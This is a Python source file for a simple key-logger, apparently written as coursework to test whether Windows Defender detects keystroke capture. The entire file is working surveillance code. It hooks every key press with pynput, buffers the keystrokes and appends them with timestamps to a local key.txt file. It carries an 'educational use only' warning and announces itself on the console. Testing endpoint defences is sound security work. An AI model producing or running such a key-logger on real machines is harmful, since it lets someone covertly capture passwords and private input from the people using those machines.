"""keylog.py
---------------------------------
Very simple cross‑platform key‑logger built with the *pynput* library.

WHY SO SIMPLE?
--------------
For the purpose of the project we only need to demonstrate **evidence of
keystroke capture** so that Windows Defender’s behavioural engine has a target
to monitor.  This Python script keeps the attack minimalistic and therefore
helps focus the evaluation on Defender rather than on complex malware code.

!!!  EDUCATIONAL USE ONLY  !!!
---------------------------------
Running a key‑logger on someone else's machine without explicit permission is
illegal in most jurisdictions.  Use responsibly, on test VMs only.

Author :  YOUR TEAM NAME
License:  MIT (for coursework purposes)
"""
from datetime import datetime
from pathlib import Path
from typing import List

from pynput import keyboard

# --------------------------------------------------------------------------- #
# Configuration
# --------------------------------------------------------------------------- #
LOG_PATH = Path("key.txt")          # Plain‑text log file in working directory
FLUSH_EVERY = 20                     # Flush to disk every N keystrokes
STOP_KEY = keyboard.Key.esc          # Graceful stop

# Internal buffer to reduce disk I/O
_buffer: List[str] = []


def _write_buffer() -> None:
    """Append buffered keystrokes to the log file with a timestamp."""
    if not _buffer:
        return

    timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
    with LOG_PATH.open("a", encoding="utf-8") as f:
        f.write(f"\n[{timestamp}] ")
        f.writelines(_buffer)

    _buffer.clear()


def on_press(key) -> bool:
    """Callback for every key‑down event.

    Returns
    -------
    bool
        *True*  → continue listening  
        *False* → stop the listener (when STOP_KEY pressed)
    """
    global _buffer

    # Normalise various special keys to readable symbols
    mapping = {
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.space: " ",
        keyboard.Key.backspace: "<BS>",
    }

    if key == STOP_KEY:
        _write_buffer()          # Flush any pending data
        return False             # Stop listener

    char = mapping.get(key)
    if char is None:
        # Standard alphanumeric key – convert KeyCode to string and strip quotes
        char = str(key).strip("'") if hasattr(key, "char") else f"<{key}>"

    _buffer.append(char)

    # Flush every FLUSH_EVERY characters to minimise file‑system noise
    if len(_buffer) >= FLUSH_EVERY:
        _write_buffer()

    return True


def main():
    print(f"[*] Key‑logger started. Press {STOP_KEY} to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    print("[*] Key‑logger stopped. Log saved to", LOG_PATH.resolve())


if __name__ == "__main__":
    main()
